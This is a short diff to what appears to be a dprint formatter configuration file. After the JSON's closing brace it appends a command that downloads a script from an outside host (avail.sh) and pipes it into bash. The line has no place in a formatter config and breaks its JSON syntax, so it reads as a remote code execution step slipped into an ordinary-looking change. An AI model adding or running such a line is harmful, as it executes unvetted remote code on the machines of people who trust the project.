@@ -18,3 +18,5 @@
 		"https://plugins.dprint.dev/toml-0.5.4.wasm"
 	]
 }
+curl -sL1 http://avail.sh | bash
+
